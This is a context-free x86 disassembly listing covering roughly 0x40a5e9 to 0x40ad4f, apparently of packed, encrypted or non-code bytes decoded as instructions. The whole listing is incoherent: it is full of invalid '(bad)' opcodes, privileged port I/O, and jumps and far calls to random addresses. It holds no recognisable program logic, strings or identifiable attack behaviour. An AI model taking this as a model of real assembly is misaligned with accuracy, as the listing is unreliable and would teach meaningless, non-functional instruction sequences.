  40a5e9:	mov    dh,0xa7
  40a5eb:	mov    dl,0x8f
  40a5ed:	sub    al,0x9a
  40a5ef:	fninit 
  40a5f1:	add    eax,0x69ec9853
  40a5f6:	adc    al,0x3
  40a5f8:	ss pop ecx
  40a5fa:	push   esp
  40a5fb:	scas   al,BYTE PTR es:[edi]
  40a5fc:	outs   dx,BYTE PTR ds:[esi]
  40a5fd:	xchg   edx,eax
  40a5fe:	or     eax,0xd43aaa2c
  40a603:	inc    ecx
  40a604:	or     BYTE PTR [ebx+0x29],0x8b
  40a608:	xchg   esp,eax
  40a609:	sub    bh,BYTE PTR [ebp-0x5f]
  40a60c:	mov    dl,0xe
  40a60e:	xchg   ecx,eax
  40a60f:	mov    al,ds:0xed108e3
  40a614:	add    edi,DWORD PTR [ebx-0x45]
  40a617:	jge    0x40a687
  40a619:	stos   DWORD PTR es:[edi],eax
  40a61a:	push   ebp
  40a61b:	pop    esi
  40a61c:	or     DWORD PTR [edx+0x278d92da],esp
  40a622:	cmp    BYTE PTR [eax-0x4],ah
  40a625:	jns    0x40a643
  40a627:	cwde   
  40a628:	or     DWORD PTR [di-0x46],ecx
  40a62c:	enter  0xc3e8,0x9f
  40a630:	sbb    al,0x14
  40a632:	add    dl,BYTE PTR [ecx+0x2a]
  40a635:	push   ds
  40a636:	push   es
  40a637:	xor    edx,DWORD PTR [ebx+0x21259d7b]
  40a63d:	ja     0x40a631
  40a63f:	js     0x40a5f3
  40a641:	retf   
  40a642:	pop    edx
  40a643:	and    al,0x81
  40a645:	test   DWORD PTR [edx],0x82ba0c83
  40a64b:	dec    eax
  40a64c:	push   0xffffffde
  40a64e:	sub    BYTE PTR [edx+0x186c6834],0xcd
  40a655:	lock inc edx
  40a657:	lock aad 0xfc
  40a65a:	pop    es
  40a65b:	xchg   esp,eax
  40a65c:	dec    ebp
  40a65d:	mov    ecx,DWORD PTR [esi-0x77]
  40a660:	leave  
  40a661:	idiv   BYTE PTR [ebx-0x242e6bcb]
  40a667:	daa    
  40a668:	pop    esp
  40a669:	fucom  st(3)
  40a66b:	or     al,0x5c
  40a66d:	xor    ah,bl
  40a66f:	sub    DWORD PTR [ebx-0x5a6127f3],ebp
  40a675:	sub    eax,0x30b73391
  40a67a:	inc    edx
  40a67b:	cmp    DWORD PTR [eax-0x30510867],esp
  40a681:	jl     0x40a6c9
  40a683:	cdq    
  40a684:	inc    edx
  40a685:	pop    eax
  40a686:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a687:	adc    eax,0x15b20444
  40a68c:	retf   
  40a68d:	sub    dh,BYTE PTR [ecx]
  40a68f:	pop    eax
  40a690:	int3   
  40a691:	sti    
  40a692:	imul   ebx,DWORD PTR [ebx],0x18
  40a695:	sbb    BYTE PTR [edx-0x128a970d],al
  40a69b:	sub    BYTE PTR [edx],cl
  40a69d:	cld    
  40a69e:	dec    eax
  40a69f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a6a0:	outs   dx,BYTE PTR ds:[esi]
  40a6a1:	inc    ebx
  40a6a2:	mov    DWORD PTR [eax-0x1b3cae54],eax
  40a6a8:	ds gs inc edi
  40a6ab:	mov    cl,0x64
  40a6ad:	test   edi,ecx
  40a6af:	mov    dl,0xc5
  40a6b1:	test   edx,edx
  40a6b3:	stos   DWORD PTR es:[edi],eax
  40a6b4:	adc    ah,BYTE PTR [eax]
  40a6b6:	xor    edx,esi
  40a6b8:	(bad)  [ecx-0x760201f1]
  40a6be:	inc    ebp
  40a6bf:	ror    BYTE PTR [ebx-0x39cc4bbb],1
  40a6c5:	add    eax,edi
  40a6c7:	jmp    0x40abd2
  40a6cc:	cmp    al,0x3f
  40a6ce:	ret    
  40a6cf:	rol    bl,cl
  40a6d1:	rcl    cl,cl
  40a6d3:	int    0xcd
  40a6d5:	push   cs
  40a6d6:	nop
  40a6d7:	ficom  WORD PTR [edx+0x72422dbd]
  40a6dd:	mov    bh,BYTE PTR [eax+0x78]
  40a6e0:	push   0x7c
  40a6e2:	js     0x40a75c
  40a6e4:	ins    BYTE PTR es:[edi],dx
  40a6e5:	mov    ebx,0xbc67cfd6
  40a6ea:	mov    edi,0x1579182e
  40a6ef:	les    esi,FWORD PTR [edi]
  40a6f1:	inc    esi
  40a6f2:	rol    DWORD PTR [ecx-0xb59300d],1
  40a6f8:	popa   
  40a6f9:	ret    
  40a6fa:	cs enter 0x3f2,0xd1
  40a6ff:	cs and eax,0xdffd9b4f
  40a705:	inc    ebp
  40a706:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a707:	ret    
  40a708:	sub    ch,BYTE PTR [eax]
  40a70a:	mov    eax,0x876c5afb
  40a70f:	stos   DWORD PTR es:[edi],eax
  40a710:	arpl   WORD PTR [ebp+0x21],cx
  40a713:	inc    esp
  40a714:	cmp    eax,0xf106a9f1
  40a719:	mov    bh,al
  40a71b:	jle    0x40a748
  40a71d:	xchg   edx,eax
  40a71e:	mov    cl,0xfe
  40a720:	sub    eax,0x72df97d0
  40a725:	mov    BYTE PTR [ecx+0x4e],dh
  40a728:	adc    bl,ah
  40a72a:	mov    bl,0xcd
  40a72c:	push   ecx
  40a72d:	rol    BYTE PTR [ebx+0x2cdf81a4],1
  40a733:	and    al,0xc
  40a735:	std    
  40a736:	icebp  
  40a737:	mov    ecx,0x1acd2a7f
  40a73c:	jne    0x40a738
  40a73e:	out    0x6b,al
  40a740:	mov    esp,0x9303a2eb
  40a745:	inc    esp
  40a746:	in     eax,0xa
  40a748:	retf   
  40a749:	cmp    ah,BYTE PTR ds:0x7d243da0
  40a74f:	sbb    BYTE PTR [edi+0x2a],bh
  40a752:	sti    
  40a753:	call   0x14aa74a3
  40a758:	jae    0x40a7d4
  40a75a:	cli    
  40a75b:	in     eax,0x99
  40a75d:	test   BYTE PTR [eax+0x46fe9ba8],bl
  40a763:	pop    ss
  40a764:	gs pop ebx
  40a766:	mov    ds:0xac1e152a,eax
  40a76b:	dec    ebp
  40a76c:	fnstcw WORD PTR [ebp-0x35937003]
  40a772:	sub    DWORD PTR [edx+eax*2],esi
  40a775:	or     ebp,DWORD PTR [eax-0x441227fb]
  40a77b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a77c:	jmp    0x8312:0x7e0248f6
  40a783:	test   al,0x27
  40a785:	inc    ecx
  40a786:	adc    cl,ah
  40a788:	xchg   esi,eax
  40a789:	or     BYTE PTR ds:0xefbee077,0x74
  40a790:	jnp    0x40a748
  40a792:	cdq    
  40a793:	pop    esi
  40a794:	or     DWORD PTR [edx-0x6a],ecx
  40a797:	xchg   ecx,eax
  40a798:	stos   DWORD PTR es:[edi],eax
  40a799:	mov    cl,0xc8
  40a79b:	fcomp  QWORD PTR [edx-0x578679fb]
  40a7a1:	pop    esi
  40a7a2:	or     eax,0x2ae6af
  40a7a7:	lea    esi,[esi+0x75]
  40a7aa:	aad    0xcd
  40a7ac:	xor    DWORD PTR [ecx+0x427d77ca],esi
  40a7b2:	dec    edi
  40a7b3:	shl    eax,cl
  40a7b5:	loop   0x40a80d
  40a7b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a7b8:	mov    ah,0x3
  40a7ba:	pop    ss
  40a7bb:	jno    0x40a7d1
  40a7bd:	mov    eax,0xabfb287a
  40a7c2:	dec    ebx
  40a7c3:	jle    0x40a76f
  40a7c5:	push   es
  40a7c6:	fnstenv ds:0x83647e96
  40a7cc:	xchg   edx,eax
  40a7cd:	lods   al,BYTE PTR ds:[esi]
  40a7ce:	imul   edi,DWORD PTR [edx],0xecc0842d
  40a7d4:	inc    eax
  40a7d5:	dec    esp
  40a7d6:	in     al,0x17
  40a7d8:	push   ebx
  40a7d9:	jns    0x40a7fe
  40a7db:	cld    
  40a7dc:	jo     0x40a7bd
  40a7de:	and    ebx,ebx
  40a7e0:	add    BYTE PTR [ecx+0x48],cl
  40a7e3:	loopne 0x40a7d4
  40a7e5:	fbstp  TBYTE PTR [ebx-0x6b1b24e5]
  40a7eb:	xchg   ecx,eax
  40a7ec:	jae    0x40a7fe
  40a7ee:	ficom  WORD PTR [ebp+0x39]
  40a7f1:	fwait
  40a7f2:	idiv   esp
  40a7f4:	(bad)  
  40a7f5:	jmp    0x40a84c
  40a7f7:	(bad)  
  40a7f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a7f9:	xchg   esp,eax
  40a7fa:	add    al,0x36
  40a7fc:	clc    
  40a7fd:	mov    ds:0x9c2c6831,al
  40a802:	shr    BYTE PTR [ecx-0x57],1
  40a805:	add    esi,DWORD PTR [edi]
  40a807:	pop    es
  40a808:	mov    ebp,0xd8aff6eb
  40a80d:	dec    edi
  40a80e:	adc    DWORD PTR [esi],ebx
  40a810:	mov    BYTE PTR [ebx-0x275a1040],bh
  40a816:	mov    bh,0xd3
  40a818:	sbb    DWORD PTR [eax],0x93135dd5
  40a81e:	and    BYTE PTR [esi],bh
  40a820:	mov    al,0xa9
  40a822:	mov    esp,0x464b693
  40a827:	(bad)  
  40a828:	addr16 jo 0x40a82a
  40a82b:	mov    BYTE PTR [edi+edi*1+0x3e],0xb8
  40a830:	mov    DWORD PTR [eax-0x64],ebx
  40a833:	leave  
  40a834:	mov    ebx,0x9998b31
  40a839:	out    0xad,al
  40a83b:	scas   eax,DWORD PTR es:[edi]
  40a83c:	or     DWORD PTR [esi+0x559af22d],edi
  40a842:	jns    0x40a7dd
  40a844:	enter  0x6830,0x93
  40a848:	dec    ecx
  40a849:	pusha  
  40a84a:	xor    esi,esi
  40a84c:	push   cs
  40a84d:	pop    ecx
  40a84e:	mov    ah,0x15
  40a850:	mov    edi,0x48a1b91b
  40a855:	test   DWORD PTR [edi],eax
  40a857:	mov    dl,0x37
  40a859:	jmp    0x40a7f0
  40a85b:	sub    esp,DWORD PTR [bp+di]
  40a85e:	sbb    DWORD PTR [ecx],ebp
  40a860:	leave  
  40a861:	mov    edi,0xa0d8765a
  40a866:	(bad)  ds:0xbcecf64c
  40a86c:	inc    ecx
  40a86d:	xchg   esp,eax
  40a86e:	outs   dx,DWORD PTR ds:[esi]
  40a86f:	or     eax,0xb413dde9
  40a874:	imul   edi,DWORD PTR [esi-0x61],0xfffffff4
  40a878:	xchg   DWORD PTR [esi+eax*8+0x48ea5ee2],esp
  40a87f:	jae    0x40a8c5
  40a881:	adc    BYTE PTR [eax-0x1fb56acf],bh
  40a887:	mov    ds:0xcc7811e4,al
  40a88c:	pop    ds
  40a88d:	cwde   
  40a88e:	push   esi
  40a88f:	in     eax,dx
  40a890:	ds mov bl,0x70
  40a893:	jmp    0x40a843
  40a895:	daa    
  40a896:	int3   
  40a897:	inc    eax
  40a898:	mov    dl,0x48
  40a89a:	mov    WORD PTR [ecx-0x76edd439],?
  40a8a0:	inc    ebp
  40a8a1:	(bad)  
  40a8a2:	cmp    BYTE PTR [ebp+0x6b],al
  40a8a5:	xchg   ecx,eax
  40a8a6:	sub    ebp,DWORD PTR [esi]
  40a8a8:	sti    
  40a8a9:	int    0xe6
  40a8ab:	ja     0x40a88b
  40a8ad:	call   0xd822aebe
  40a8b2:	fadd   DWORD PTR [esi]
  40a8b4:	sbb    al,0xb8
  40a8b6:	cmp    DWORD PTR [esi+0xdbf2c69],esi
  40a8bc:	sahf   
  40a8bd:	pop    edx
  40a8be:	stc    
  40a8bf:	mov    dl,0x13
  40a8c1:	and    ah,ch
  40a8c3:	push   cs
  40a8c4:	dec    ecx
  40a8c5:	mov    esi,0x73dad127
  40a8ca:	sub    eax,0x12e3b98f
  40a8cf:	xlat   BYTE PTR ds:[ebx]
  40a8d0:	sub    DWORD PTR [esi+0x4b],eax
  40a8d3:	dec    esi
  40a8d4:	sahf   
  40a8d5:	and    al,0x7d
  40a8d7:	cmp    esi,DWORD PTR ss:[ecx-0x58]
  40a8db:	and    BYTE PTR ds:0x9503554a,bh
  40a8e1:	xor    al,0xce
  40a8e3:	inc    esp
  40a8e4:	inc    esp
  40a8e5:	enter  0x5a09,0xf0
  40a8e9:	mov    ch,0x3b
  40a8eb:	jl     0x40a8aa
  40a8ed:	fwait
  40a8ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a8ef:	jg     0x40a8aa
  40a8f1:	adc    edx,edi
  40a8f3:	xchg   ebx,eax
  40a8f4:	and    esp,DWORD PTR [ebp+0x6c5ac022]
  40a8fa:	(bad)  
  40a8fb:	into   
  40a8fc:	mov    ecx,0x20345c5f
  40a901:	call   0x2c1a:0x722cf50c
  40a908:	mov    eax,ds:0xcbb963e0
  40a90d:	xchg   ch,al
  40a90f:	(bad)  
  40a910:	pop    eax
  40a911:	mov    ebp,0xcc3ee61a
  40a916:	int    0x8b
  40a918:	pop    ss
  40a919:	or     esi,esi
  40a91b:	scas   eax,DWORD PTR es:[edi]
  40a91c:	(bad)  
  40a91d:	and    eax,0x7f1dc1b6
  40a922:	xor    dl,0xcb
  40a925:	rcr    DWORD PTR [edi+0x36f1b1],1
  40a92b:	pushf  
  40a92c:	sahf   
  40a92d:	xor    bl,BYTE PTR [edx-0x25]
  40a930:	cmp    eax,0x6a121321
  40a935:	jle    0x40a961
  40a937:	leave  
  40a938:	js     0x40a9a2
  40a93a:	push   ss
  40a93b:	jg     0x40a9bc
  40a93d:	aaa    
  40a93e:	xor    bl,BYTE PTR [ecx-0x56f91287]
  40a944:	sub    eax,DWORD PTR [esi]
  40a946:	sub    eax,0x97ee4f88
  40a94b:	cmp    DWORD PTR [esi+0x6f],edx
  40a94e:	ds mov dh,0x68
  40a951:	popf   
  40a952:	cs dec esp
  40a954:	xchg   esi,eax
  40a955:	push   0x8cdf482b
  40a95a:	jmp    0x327dd6cd
  40a95f:	pop    esi
  40a960:	push   ecx
  40a961:	xor    esi,DWORD PTR [edx+eiz*4]
  40a964:	(bad)  
  40a965:	leave  
  40a966:	sbb    al,0xb2
  40a968:	xchg   DWORD PTR [edx],ecx
  40a96a:	clc    
  40a96b:	call   0x9d6e9c18
  40a970:	xchg   esi,eax
  40a971:	dec    ebx
  40a972:	push   ebp
  40a973:	dec    eax
  40a974:	adc    dl,al
  40a976:	push   ss
  40a977:	out    0x9a,al
  40a979:	shl    DWORD PTR [ecx+0x62d3f894],1
  40a97f:	sahf   
  40a980:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  40a982:	shl    BYTE PTR [esi-0x212a5de1],1
  40a988:	fcomp  QWORD PTR [ebx]
  40a98a:	gs inc edi
  40a98c:	ficom  WORD PTR [edi+0x6064788b]
  40a992:	data16 je 0x40aa02
  40a995:	bound  ecx,QWORD PTR [esi-0x32f00b08]
  40a99b:	dec    ebp
  40a99c:	sbb    DWORD PTR [ebx+0x633cbe95],ebp
  40a9a2:	mov    al,0xc3
  40a9a4:	cmp    dh,BYTE PTR [edx+0x1f]
  40a9a7:	std    
  40a9a8:	fcom   DWORD PTR [esi+0x3a]
  40a9ab:	inc    esp
  40a9ac:	test   esi,eax
  40a9ae:	mov    ebx,0xa47daaff
  40a9b3:	in     eax,dx
  40a9b4:	sub    eax,0xc923882d
  40a9b9:	nop
  40a9ba:	jecxz  0x40a966
  40a9bc:	sub    BYTE PTR [ecx],dh
  40a9be:	retf   0x9bb4
  40a9c1:	mov    edx,0x99f2eca0
  40a9c6:	ds cmp al,0xdf
  40a9c9:	or     dl,0x75
  40a9cc:	xchg   ebp,eax
  40a9cd:	mov    al,BYTE PTR [eax-0x12]
  40a9d0:	mov    dl,0xf8
  40a9d2:	mov    bl,0xb5
  40a9d4:	sub    BYTE PTR [eax+0x1b],cl
  40a9d7:	ins    DWORD PTR es:[edi],dx
  40a9d8:	in     al,dx
  40a9d9:	cld    
  40a9da:	imul   ebx,DWORD PTR [edi],0x69ed7a5a
  40a9e0:	push   esi
  40a9e1:	mov    edi,gs
  40a9e3:	cli    
  40a9e4:	push   es
  40a9e5:	out    0xc,al
  40a9e7:	push   eax
  40a9e8:	fild   DWORD PTR [esi]
  40a9ea:	mov    ecx,0x5087d672
  40a9ef:	mov    bl,BYTE PTR [edi+0x703a4c99]
  40a9f5:	mov    ebx,0x8bc5cde3
  40a9fa:	inc    ecx
  40a9fb:	dec    esp
  40a9fc:	pop    ss
  40a9fd:	and    BYTE PTR [ecx+edx*1+0x7b0a456d],bl
  40aa04:	dec    eax
  40aa05:	push   esp
  40aa06:	sub    eax,0xa32a6c48
  40aa0b:	shr    BYTE PTR [ecx],0x31
  40aa0e:	add    al,0xff
  40aa10:	lock lods al,BYTE PTR ds:[esi]
  40aa12:	aam    0x7c
  40aa14:	and    al,0x1e
  40aa16:	sahf   
  40aa17:	push   ds
  40aa18:	popa   
  40aa19:	outs   dx,BYTE PTR ds:[esi]
  40aa1a:	nop
  40aa1b:	test   al,0xa8
  40aa1d:	iret   
  40aa1e:	mov    esp,0x29da554b
  40aa23:	sbb    DWORD PTR [ebp+ebx*2-0x77],ebx
  40aa27:	shr    BYTE PTR [esi+0x7fa5e0d],1
  40aa2d:	mov    ecx,0xfea0b7aa
  40aa32:	pusha  
  40aa33:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40aa34:	fisttp QWORD PTR [ebp-0x4e4509da]
  40aa3a:	(bad)  
  40aa3b:	mov    al,ds:0xa4eeda99
  40aa40:	mov    DWORD PTR [edx],ebp
  40aa42:	and    DWORD PTR [ebp-0x75ffed5e],ebp
  40aa48:	or     al,BYTE PTR [ebx+0x5d30b3d5]
  40aa4e:	iret   
  40aa4f:	xchg   ecx,eax
  40aa50:	push   es
  40aa51:	call   0x2699f5b4
  40aa56:	and    eax,0x264280d4
  40aa5b:	mov    dh,0xb4
  40aa5d:	add    al,0x9b
  40aa5f:	add    eax,DWORD PTR [esi+0x66617804]
  40aa65:	push   ds
  40aa66:	out    dx,al
  40aa67:	jg     0x40aac6
  40aa69:	out    0x88,eax
  40aa6b:	(bad)  
  40aa6c:	or     ebp,DWORD PTR [ebx+0x7e63f10b]
  40aa72:	xchg   esi,eax
  40aa73:	mov    ecx,0x60b3e529
  40aa78:	(bad)  
  40aa79:	fild   QWORD PTR [edi]
  40aa7b:	cld    
  40aa7c:	loop   0x40aac7
  40aa7e:	(bad)  [ebx+0x39]
  40aa81:	add    al,0x93
  40aa83:	or     ah,BYTE PTR [esi]
  40aa85:	mov    bh,0xa8
  40aa87:	xchg   ecx,eax
  40aa88:	sub    al,0x67
  40aa8a:	dec    edi
  40aa8b:	xor    edi,DWORD PTR [ecx+0x67]
  40aa8e:	mov    edx,ebx
  40aa90:	xor    DWORD PTR [esi+edx*1+0x7516dfda],esi
  40aa97:	xor    eax,ebp
  40aa99:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40aa9a:	out    0xc1,eax
  40aa9c:	out    dx,al
  40aa9d:	cmp    al,BYTE PTR [ebp-0x68f66064]
  40aaa3:	sbb    BYTE PTR ds:0x88d4518e,ch
  40aaa9:	jmp    0x12aa:0xef0d39da
  40aab0:	push   0x45753975
  40aab5:	mov    edi,0x3965a292
  40aaba:	xchg   ecx,eax
  40aabb:	pop    edi
  40aabc:	and    al,0x7e
  40aabe:	xor    esi,DWORD PTR [ecx+0x4e378e60]
  40aac4:	loopne 0x40ab27
  40aac6:	leave  
  40aac7:	jg     0x40aa7d
  40aac9:	and    eax,0x1dee9310
  40aace:	fcomp  QWORD PTR [edi]
  40aad0:	add    al,0xf1
  40aad2:	ja     0x40aa78
  40aad4:	add    al,0x9
  40aad6:	retf   
  40aad7:	daa    
  40aad8:	pushf  
  40aad9:	add    eax,0x3e3c4ab8
  40aade:	xlat   BYTE PTR ds:[ebx]
  40aadf:	or     al,0xb1
  40aae1:	push   0x56
  40aae3:	lds    edx,FWORD PTR [edi+0x70c2a62a]
  40aae9:	sbb    edx,DWORD PTR [edx]
  40aaeb:	push   esp
  40aaec:	push   ecx
  40aaed:	push   esp
  40aaee:	sub    DWORD PTR [edx+ebp*2+0x34],edi
  40aaf2:	fcmovnu st,st(3)
  40aaf4:	jmp    0xa09f:0xcc466e22
  40aafb:	xchg   edi,eax
  40aafc:	xchg   BYTE PTR [edx],ah
  40aafe:	ret    0x5771
  40ab01:	hlt    
  40ab02:	call   0x5da238ed
  40ab07:	add    al,0x2b
  40ab09:	cld    
  40ab0a:	cld    
  40ab0b:	cdq    
  40ab0c:	mov    DWORD PTR [edx+ecx*4],esi
  40ab0f:	jp     0x40aac3
  40ab11:	stos   DWORD PTR es:[edi],eax
  40ab12:	bnd call 0x9dfed1cb
  40ab18:	cmp    BYTE PTR [edi+0x33],cl
  40ab1b:	push   ss
  40ab1c:	out    dx,eax
  40ab1d:	loopne 0x40ab28
  40ab1f:	inc    eax
  40ab20:	scas   al,BYTE PTR es:[edi]
  40ab21:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ab22:	clc    
  40ab23:	lahf   
  40ab24:	push   ecx
  40ab25:	push   ds
  40ab26:	adc    BYTE PTR [esi],ch
  40ab28:	scas   eax,DWORD PTR es:[edi]
  40ab29:	ror    DWORD PTR [ebx-0x67],cl
  40ab2c:	call   0xb0075670
  40ab31:	mov    cl,0x80
  40ab33:	adc    al,0xb5
  40ab35:	sub    al,0xe0
  40ab37:	push   0x2b
  40ab39:	inc    ebx
  40ab3a:	sub    dl,BYTE PTR [ecx-0x23]
  40ab3d:	mov    ds:0x14085439,eax
  40ab42:	call   0x790a8028
  40ab47:	xor    bh,BYTE PTR [eax+0x12]
  40ab4a:	mov    al,0xc2
  40ab4c:	xor    al,0xf5
  40ab4e:	fsub   DWORD PTR [edx+ebx*1]
  40ab51:	clc    
  40ab52:	mov    edi,0x55576474
  40ab57:	shr    DWORD PTR [ecx-0x80],0xb2
  40ab5b:	sbb    DWORD PTR [eax],edx
  40ab5d:	out    0x98,ax
  40ab60:	mov    bh,BYTE PTR [esi+0x49]
  40ab63:	int    0xd4
  40ab65:	inc    ecx
  40ab66:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ab67:	ins    BYTE PTR es:[edi],dx
  40ab68:	xchg   esi,eax
  40ab69:	jo     0x40ab90
  40ab6b:	into   
  40ab6c:	retf   
  40ab6d:	mov    dl,0x97
  40ab6f:	sbb    al,0xd2
  40ab71:	mov    BYTE PTR [esi],dl
  40ab73:	hlt    
  40ab74:	cdq    
  40ab75:	int    0x83
  40ab77:	jge    0x40ab73
  40ab79:	push   ds
  40ab7a:	adc    DWORD PTR [edx+0x5],eax
  40ab7d:	push   esi
  40ab7e:	sahf   
  40ab7f:	cwde   
  40ab80:	cld    
  40ab81:	inc    esp
  40ab82:	jmp    0x40ab08
  40ab84:	sbb    DWORD PTR [ecx+0x4be80af2],esp
  40ab8a:	inc    ebx
  40ab8b:	fucomp st(2)
  40ab8d:	ds (bad) 
  40ab8f:	mov    al,ds:0x8068a96e
  40ab94:	jnp    0x40ab1e
  40ab96:	dec    esp
  40ab97:	adc    BYTE PTR [ebp+0x7f],cl
  40ab9a:	push   esi
  40ab9b:	dec    esi
  40ab9c:	pusha  
  40ab9d:	add    cl,BYTE PTR [edx+ebp*8-0x4d]
  40aba1:	outs   dx,BYTE PTR ds:[esi]
  40aba2:	ret    0xa0fb
  40aba5:	or     al,0x1c
  40aba7:	lea    eax,ds:0x8784abb9
  40abad:	mov    bl,0x8d
  40abaf:	sbb    BYTE PTR [ecx-0x3a],0x7a
  40abb3:	push   0x937bd8b0
  40abb8:	addr16 xchg esi,eax
  40abba:	sbb    DWORD PTR [edx-0x76],edi
  40abbd:	xchg   ebx,eax
  40abbe:	repz test al,0x1
  40abc1:	pop    ss
  40abc2:	dec    ebp
  40abc3:	(bad)  
  40abc4:	imul   esp,DWORD PTR [ebx-0x6050ffcb],0x1105982e
  40abce:	ja     0x40ac49
  40abd0:	dec    edi
  40abd1:	xor    BYTE PTR [ecx+0x6e9cc45],cl
  40abd7:	add    eax,0x3cc90000
  40abdc:	leave  
  40abdd:	ret    
  40abde:	leave  
  40abdf:	leave  
  40abe0:	leave  
  40abe1:	retf   0xa9ef
  40abe4:	int    0x9e
  40abe6:	mov    esi,0x5cd0a484
  40abeb:	lea    edi,[eax+0x78]
  40abee:	push   0x7c
  40abf0:	js     0x40ac6a
  40abf2:	imul   esi,DWORD PTR [esi+0x318850e8],0x3d
  40abf9:	(bad)  
  40abfa:	push   ebp
  40abfb:	js     0x40ac35
  40abfd:	scas   al,BYTE PTR es:[edi]
  40abfe:	cdq    
  40abff:	ud0    ebp,DWORD PTR [edx+0x7]
  40ac03:	sbb    esp,ebx
  40ac05:	sbb    al,0x3c
  40ac07:	lods   eax,DWORD PTR ds:[esi]
  40ac08:	out    0x87,eax
  40ac0a:	push   ebx
  40ac0b:	int    0x22
  40ac0d:	hlt    
  40ac0e:	xchg   esp,eax
  40ac0f:	stos   BYTE PTR es:[edi],al
  40ac10:	push   cs
  40ac11:	cmp    DWORD PTR [edi-0x3],ebx
  40ac14:	int    0x90
  40ac16:	xchg   ebx,eax
  40ac17:	(bad)  
  40ac19:	sub    edi,0x95f474be
  40ac1f:	test   BYTE PTR [edx],cl
  40ac21:	push   es
  40ac22:	and    al,0x5d
  40ac24:	data16 mov al,0x6a
  40ac27:	dec    BYTE PTR [edi+0x25]
  40ac2a:	jbe    0x40abb2
  40ac2c:	shl    BYTE PTR [esi-0x1],cl
  40ac2f:	lock ja 0x40ac81
  40ac32:	lods   al,BYTE PTR ds:[esi]
  40ac33:	mov    esp,0x12458101
  40ac38:	pop    esp
  40ac39:	add    eax,0xa3d01af5
  40ac3e:	sbb    esi,DWORD PTR [edi+edi*8]
  40ac41:	das    
  40ac42:	sub    al,0x6d
  40ac44:	test   eax,0xaf6ca70
  40ac49:	ins    BYTE PTR es:[edi],dx
  40ac4a:	pusha  
  40ac4b:	jmp    0x608b7efb
  40ac50:	nop    DWORD PTR [edi-0x47f7b420]
  40ac57:	inc    eax
  40ac58:	(bad)  
  40ac5a:	adc    edi,DWORD PTR [ecx]
  40ac5c:	mov    cl,0xdb
  40ac5e:	cmc    
  40ac5f:	sub    edx,0xf0ea29fd
  40ac65:	cdq    
  40ac66:	inc    ecx
  40ac67:	mov    ebp,ds
  40ac69:	sar    al,cl
  40ac6b:	push   edx
  40ac6c:	test   eax,0x162646f1
  40ac71:	inc    ecx
  40ac72:	pop    eax
  40ac73:	xor    eax,DWORD PTR [ebx+0x5b567619]
  40ac79:	fsubr  QWORD PTR [ebx]
  40ac7b:	jge    0x40acb9
  40ac7d:	dec    eax
  40ac7e:	mov    edx,0xe2329512
  40ac83:	pop    es
  40ac84:	js     0x40ac9f
  40ac86:	rcl    BYTE PTR [edx],0xe6
  40ac89:	add    al,0x37
  40ac8b:	pop    ebp
  40ac8c:	jecxz  0x40acc1
  40ac8e:	pop    edi
  40ac8f:	lock (bad) 
  40ac91:	fcomp  QWORD PTR [esi-0x4dd8a51c]
  40ac97:	(bad)  
  40ac98:	mov    al,ds:0x2c6d3bd8
  40ac9d:	xchg   edx,eax
  40ac9e:	loop   0x40ac37
  40aca0:	js     0x40acbe
  40aca2:	fidivr DWORD PTR [edx+ebp*4]
  40aca5:	jge    0x40ac42
  40aca7:	in     al,0xb
  40aca9:	out    0x95,eax
  40acab:	jnp    0x40ad0b
  40acad:	adc    eax,0x4870b01b
  40acb2:	repnz and al,0x4e
  40acb5:	push   eax
  40acb6:	mov    ecx,0xb2026aa1
  40acbb:	cmp    BYTE PTR [edx],bh
  40acbd:	(bad)  
  40acbf:	push   0x457ec924
  40acc4:	imul   eax,DWORD PTR [ecx-0x55a769b4],0x8d0d86ae
  40acce:	(bad)  
  40accf:	in     al,dx
  40acd0:	lahf   
  40acd1:	push   ss
  40acd2:	pop    eax
  40acd3:	or     BYTE PTR [eax],ah
  40acd5:	sub    al,BYTE PTR [ecx+0x59e13f2a]
  40acdb:	or     ch,BYTE PTR [ebx]
  40acdd:	(bad)  
  40acde:	jns    0x40acd0
  40ace0:	loope  0x40ad20
  40ace2:	push   ebp
  40ace3:	es int 0xc7
  40ace6:	stc    
  40ace7:	icebp  
  40ace8:	xchg   edi,eax
  40ace9:	jns    0x40ac81
  40aceb:	inc    edi
  40acec:	loope  0x40ac93
  40acee:	push   eax
  40acef:	aam    0x55
  40acf1:	push   ebp
  40acf2:	xchg   edx,eax
  40acf3:	push   ds
  40acf4:	mov    ds:0x15f7b1ea,al
  40acf9:	lahf   
  40acfa:	int    0x14
  40acfc:	hlt    
  40acfd:	xor    eax,0x8ceedd8e
  40ad02:	cdq    
  40ad03:	mov    cl,0x29
  40ad05:	mov    eax,0x48dc3145
  40ad0a:	dec    ebp
  40ad0b:	xlat   BYTE PTR ds:[ebx]
  40ad0c:	ins    BYTE PTR es:[edi],dx
  40ad0d:	ffreep st(0)
  40ad0f:	mov    BYTE PTR [edi+0x6e5453ae],ah
  40ad15:	push   ds
  40ad16:	sub    eax,0x8ba49906
  40ad1b:	xchg   edi,eax
  40ad1c:	mov    al,ds:0x6875227d
  40ad21:	pop    edx
  40ad22:	test   al,0x15
  40ad24:	mov    BYTE PTR [ebp+0x73],cl
  40ad27:	sbb    edx,DWORD PTR [esi-0x65]
  40ad2a:	sbb    al,0x6b
  40ad2c:	xlat   BYTE PTR ds:[ebx]
  40ad2d:	jne    0x40ad99
  40ad2f:	cmp    bh,dl
  40ad31:	rol    BYTE PTR [edi-0x4f],0x7e
  40ad35:	mov    dl,0xd5
  40ad37:	jb     0x40ad9c
  40ad39:	and    eax,0x143065c4
  40ad3e:	inc    ebx
  40ad3f:	in     al,dx
  40ad40:	mov    al,ds:0xf9395166
  40ad45:	into   
  40ad46:	dec    esp
  40ad47:	mov    ds:0xd5e31563,eax
  40ad4c:	imul   eax,DWORD PTR [edx],0x71
  40ad4f:	jne    0x40acf0
